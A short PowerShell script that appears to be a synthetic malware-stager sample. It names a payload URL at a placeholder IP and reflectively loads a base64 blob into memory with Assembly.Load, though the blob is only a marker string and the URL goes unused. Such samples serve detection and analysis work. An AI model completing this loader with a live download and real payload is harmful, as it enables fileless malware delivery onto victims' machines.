[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://198.51.100.110:443/payload.bin',
    [int]$TimeoutSec = 156
)
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4dDZ1aWdpaHQw')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$StageResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $StageResult) {
    Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
}

$StageMarker = "stage-43"
$ProgressPreference = "SilentlyContinue"
